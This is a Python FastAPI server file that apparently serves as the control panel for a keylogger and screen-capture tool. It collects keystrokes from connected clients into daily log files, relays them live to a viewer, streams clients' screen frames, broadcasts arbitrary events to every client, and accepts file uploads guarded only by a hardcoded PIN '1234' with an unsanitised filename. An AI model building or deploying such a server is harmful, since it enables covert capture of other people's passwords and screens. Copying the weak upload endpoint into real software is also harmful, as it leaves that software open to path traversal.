import base64
import logging
import traceback
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import List
from fastapi import Request
from pydantic import BaseModel
import json
import uvicorn
import os
from datetime import datetime
import asyncio


app = FastAPI()

active_connections = []

app.mount(
    "/static", StaticFiles(directory="py_ws_executor/server/static"), name="static")

templates = Jinja2Templates(directory="py_ws_executor/server/templates")

UPLOAD_PIN = "1234"


class EventRequest(BaseModel):
    event: str
    data: dict


class ConnectionManager:
    def __init__(self):
        # Dict mapping WebSocket connections to client info
        self.active_clients: dict[WebSocket, dict] = {}
        self.stream_locks: dict[str, asyncio.Lock] = {}
        self.frame_queues: dict[str, asyncio.Queue] = {}
        self.client_data_ws: dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        data = await websocket.receive_json()
        event = data.get("event")
        data = data.get("data")
        if event == "connect":
            if data["client_type"] == "client":
                client = {
                    "client_id": data["client_id"],
                    "keystrokes": [],
                    "settings": {
                        "keystrokes": True,
                    },
                    "streaming_ws": None,
                }
                self.active_clients[websocket] = client
                self.stream_locks[data["client_id"]] = asyncio.Lock()
                self.frame_queues[data["client_id"]] = asyncio.Queue()  # Only keep latest frame
                asyncio.create_task(self.handle_keystrokes(
                    self.active_clients[websocket]))
            elif data["client_type"] == "client_stream":
                print("attatching streaming ws")
                self.attatch_streaming_ws(websocket, data["client_id"])
            elif data["client_type"] == "client_data":
                self.client_data_ws[data["client_id"]] = websocket

    def attatch_streaming_ws(self, websocket: WebSocket, client_id: str):
        for client in self.active_clients:
            if self.active_clients[client]["client_id"] == client_id:
                self.active_clients[client]["streaming_ws"] = websocket

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_clients:
            client_id = self.active_clients[websocket]["client_id"]
            if client_id in self.stream_locks:
                del self.stream_locks[client_id]
            if client_id in self.frame_queues:
                del self.frame_queues[client_id]
            del self.active_clients[websocket]

    async def send_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for websocket in self.active_clients:
            await websocket.send_text(message)

    async def handle_keystrokes(self, client_dict):
        os.makedirs('py_ws_executor/server/keystrokes', exist_ok=True)

        while True:
            await asyncio.sleep(10)

            current_time = datetime.now()
            today = current_time.strftime('%Y-%m-%d')
            filename = f'py_ws_executor/server/keystrokes/{today}.txt'

            if client_dict["settings"]["keystrokes"]:
                if client_dict["keystrokes"]:
                    with open(filename, 'a') as f:
                        f.write(''.join(client_dict["keystrokes"]) + '\n')
                client_dict["keystrokes"] = []


manager = ConnectionManager()


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)

    try:
        while True:
            try:
                stream_event = {"event": "stream", "data": {"value": True}}

                await manager.send_message(json.dumps(stream_event), websocket)
                data = await websocket.receive()
                print(websocket.client)
                if data.get("type") == "websocket.receive":
                    data = json.loads(data.get("text"))
                else:
                    print(f"Received unexpected data type: {data.get('type')}")
                    continue
                event = data.get("event")
                if event:
                    event_data = data.get("data", {})
                    if event == "keypress":
                        key = event_data.get('key')
                        manager.active_clients[websocket]["keystrokes"].append(
                            key)
                        front_end_ws = manager.client_data_ws.get(
                            manager.active_clients[websocket]["client_id"])
                        if front_end_ws:
                            await manager.send_message(json.dumps({"event": "keypress", "data": {"key": key}}), front_end_ws)
                    if event == "stream":
                        manager.active_clients[websocket]["settings"][
                            "streaming"] = not manager.active_clients[websocket]["settings"]["streaming"]
                    if event == "stream_data":
                        client_id = event_data["client_id"]
                        frame = event_data.get("frame")
                        if frame:
                            try:
                                frame = base64.b64decode(frame)
                                # Put frame in queue, replacing old frame if queue is full
                                manager.frame_queues[client_id].put_nowait(frame)
                            except asyncio.QueueFull:
                                # Clear old frame
                                _ = manager.frame_queues[client_id].get_nowait()
                                manager.frame_queues[client_id].put_nowait(frame)
                            except Exception as e:
                                print(f"Error decoding frame: {e}")
                                pass
                    

                    await manager.broadcast(json.dumps({"event": event, "data": event_data}))
                else:
                    await manager.send_message("Error: Invalid event format", websocket)
            except json.JSONDecodeError:
                await manager.send_message("Error: Received invalid JSON", websocket)
            except Exception as e:
                print(f"Error handling websocket message: {e}")
                print(traceback.format_exc())
                print(f"client type: {manager.active_clients[websocket]['client_type']}")
                break

    except WebSocketDisconnect as e:
        print(f"WebSocket disconnected with code {e.code}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        manager.disconnect(websocket)


@app.get("/tts", response_class=HTMLResponse)
async def get_html_page(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/send-event")
async def send_event(request: EventRequest):
    try:
        event = request.event
        data = request.data

        await manager.broadcast(json.dumps({"event": event, "data": data}))

        return JSONResponse(content={"status": "Event sent successfully"})
    except Exception as e:
        raise HTTPException(status_code=500, detail="Failed to send event")


@app.post("/upload")
async def upload_file(
    file: UploadFile = File(...),
    pin: str = Form(...),
):
    if pin != UPLOAD_PIN:
        raise HTTPException(status_code=403, detail="Invalid PIN")

    try:
        upload_dir = "py_ws_executor/server/uploads"
        os.makedirs(upload_dir, exist_ok=True)

        file_path = os.path.join(upload_dir, file.filename)
        with open(file_path, "wb") as buffer:
            content = await file.read()
            buffer.write(content)

        return JSONResponse(content={
            "status": "success",
            "message": "File uploaded successfully",
            "filename": file.filename
        })
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"Failed to upload file: {str(e)}")


@app.get("/stream", response_class=HTMLResponse)
async def get_stream_page(request: Request):
    return templates.TemplateResponse("stream.html", {"request": request})


@app.get("/streamingWs")
async def get_streaming_ws(request: Request):
    streaming_ws = [
        ws for ws in manager.active_clients if manager.active_clients[ws]["streaming_ws"] is not None]
    print(streaming_ws)
    print([manager.active_clients[ws]
                         ["client_id"] for ws in streaming_ws])
    streaming_clients = [manager.active_clients[ws]
                         ["client_id"] for ws in streaming_ws]
    return JSONResponse(content={"client_websockets": streaming_clients})


@app.get("/stream/{client_id}")
async def get_stream(client_id: str):
    async def get_stream_for_client(client_id: str):
        if client_id not in manager.frame_queues:
            print(f"Client {client_id} not found or not streaming")

        last_frame = None  # Variable to hold the last valid frame

        while True:
            try:
                # Wait for new frame with timeout
                frame = await asyncio.wait_for(manager.frame_queues[client_id].get(), timeout=1.0)
                boundary = "frame"
                yield_statement = (
                    f"--{boundary}\r\n"
                    f"Content-Type: image/webp\r\n"
                    f"Content-Length: {len(frame)}\r\n\r\n"
                ).encode("utf-8")

                if frame:
                    yield yield_statement + frame + b"\r\n"
                elif last_frame:
                    # If timeout but we have a valid previous frame, send that instead
                    yield yield_statement + (last_frame) + b"\r\n"

            except asyncio.TimeoutError:
                if last_frame:
                    yield yield_statement + (last_frame) + b"\r\n"
            except Exception as e:
                print(f"Stream error: {e}")
                break

    return StreamingResponse(get_stream_for_client(client_id), media_type="multipart/x-mixed-replace; boundary=frame")

if __name__ == "__main__":
    uvicorn.run(app, host="localhost", port=8123, ws_ping_interval=None)
